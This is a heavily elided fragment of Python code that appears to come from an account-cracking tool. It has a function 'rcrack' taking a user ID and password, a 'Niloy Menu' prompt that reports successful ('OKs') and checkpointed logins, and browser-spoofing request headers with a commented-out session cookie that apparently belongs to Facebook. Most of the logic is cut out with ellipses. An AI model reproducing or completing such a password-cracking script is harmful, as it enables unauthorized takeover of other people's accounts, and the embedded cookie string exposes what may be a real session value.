...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back Niloy Menu ")
        exit()
...
def rcrack(uid,pwx,tl):
  ...
  "method": 'GET',         
   "scheme": 'https',
    ...
    # 'cookie': 'datr=0YH4ZQl6zsic-KFumzrEV_Cr; sb=0YH4ZavRZ5UNiymrdqEDA7kg; m_pixel_ratio=3; wd=360x692; ps_n=0; ps_l=0; fr=0hWOLuccUbFbZu7s9..Bl-IHR..AAA.0.0.Bl-IHc.AWV-lgTHbb8',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="122", "Google Chrome";v="122"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="122.0.6338.224", "Google Chrome";v="122.0.6338.224"',
    'sec-ch-ua-mobile': '?0',
